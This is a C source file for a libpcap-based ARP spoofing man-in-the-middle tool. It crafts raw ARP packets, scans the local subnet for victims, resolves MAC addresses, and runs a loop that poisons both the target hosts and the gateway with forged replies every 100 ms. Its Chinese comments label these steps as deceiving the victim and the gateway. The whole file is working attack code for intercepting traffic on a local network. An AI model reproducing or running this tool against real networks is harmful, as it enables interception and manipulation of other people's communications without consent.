#include "arp.h"
#include "tools.h"
#include <unistd.h>

void send_arp_raw(pcap_t *handle, uint16_t op, 
                  uint8_t *src_mac, uint32_t src_ip, 
                  uint8_t *dst_mac, uint32_t dst_ip) {
    
    int pkt_len = sizeof(struct my_ethhdr) + sizeof(struct my_arphdr);
    uint8_t packet[pkt_len];

    struct my_ethhdr *eth = (struct my_ethhdr *)packet;
    struct my_arphdr *arp = (struct my_arphdr *)(packet + sizeof(struct my_ethhdr));

    memcpy(eth->ether_shost, src_mac, 6);
    if (op == ARPOP_REQUEST) memset(eth->ether_dhost, 0xff, 6);
    else memcpy(eth->ether_dhost, dst_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp->ar_hrd = htons(1); 
    arp->ar_pro = htons(ETHERTYPE_IP);
    arp->ar_hln = 6; 
    arp->ar_pln = 4;
    arp->ar_op  = htons(op);

    memcpy(arp->ar_sha, src_mac, 6);
    memcpy(arp->ar_sip, &src_ip, 4);
    
    if (op == ARPOP_REQUEST) memset(arp->ar_tha, 0, 6);
    else memcpy(arp->ar_tha, dst_mac, 6);
    
    memcpy(arp->ar_tip, &dst_ip, 4);

    pcap_sendpacket(handle, packet, pkt_len);
}


void *arp_spoof_loop(void *arg) {
    MitmContext *ctx = (MitmContext *)arg;
    printf("[*] Spoofing Thread Started (Ultra Aggressive Mode)...\n");
    
    while (1) {
        if (ctx->target_count == 0) {
            sleep(1);
            continue;
        }

        for (int i = 0; i < ctx->target_count; i++) {
            if (!ctx->targets[i].active) continue;

            // 欺騙受害者
            send_arp_raw(ctx->handle, ARPOP_REPLY, ctx->my_mac, ctx->gateway_ip, 
                         ctx->targets[i].mac, ctx->targets[i].ip);
            
            // 欺騙 Gateway
            send_arp_raw(ctx->handle, ARPOP_REPLY, ctx->my_mac, ctx->targets[i].ip, 
                         ctx->gateway_mac, ctx->gateway_ip);
        }
        
        
        usleep(100000); 
    }
    return NULL;
}

// 持續掃描執行緒
void *arp_scan_loop(void *arg) {
    MitmContext *ctx = (MitmContext *)arg;
    printf("[*] Background Scanner Thread Started...\n");

    while (1) {
        uint32_t my_ip_host = ntohl(ctx->my_ip);
        uint32_t subnet = my_ip_host & 0xFFFFFF00; 

        for (int i = 1; i < 255; i++) {
            uint32_t target_ip = htonl(subnet | i);
            if (target_ip == ctx->my_ip || target_ip == ctx->gateway_ip) continue;
            send_arp_raw(ctx->handle, ARPOP_REQUEST, ctx->my_mac, ctx->my_ip, NULL, target_ip);
            usleep(20000); 
        }
        sleep(5);
    }
    return NULL;
}

// 初始化用的單次掃描
uint32_t scan_network_for_victim(pcap_t *handle, uint32_t my_ip, uint32_t gateway_ip, uint32_t netmask, uint8_t *my_mac) {
    uint32_t net_addr = my_ip & netmask;
    for (int i = 1; i < 255; i++) {
        uint32_t target_ip = net_addr | htonl(i);
        if (target_ip == my_ip || target_ip == gateway_ip) continue;
        send_arp_raw(handle, ARPOP_REQUEST, my_mac, my_ip, NULL, target_ip);
        usleep(5000);
    }
    return 0; // 實際接收交給 main loop
}

int get_mac_of_ip(pcap_t *handle, uint8_t *my_mac, uint32_t my_ip, uint32_t target_ip, uint8_t *target_mac_out) {
    for(int k=0; k<3; k++) {
        send_arp_raw(handle, ARPOP_REQUEST, my_mac, my_ip, NULL, target_ip);
        usleep(20000);
    }
    
    struct pcap_pkthdr *header;
    const u_char *pkt_data;
    time_t start = time(NULL);

    while((time(NULL) - start) < 2) {
        if(pcap_next_ex(handle, &header, &pkt_data) > 0) {
            struct my_ethhdr *eth = (struct my_ethhdr *)pkt_data;
            if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
                struct my_arphdr *arp = (struct my_arphdr *)(pkt_data + sizeof(struct my_ethhdr));
                if (ntohs(arp->ar_op) == ARPOP_REPLY) {
                    uint32_t reply_ip;
                    memcpy(&reply_ip, arp->ar_sip, 4);
                    if (reply_ip == target_ip) {
                        memcpy(target_mac_out, arp->ar_sha, 6);
                        return 0;
                    }
                }
            }
        }
    }
    return -1;
}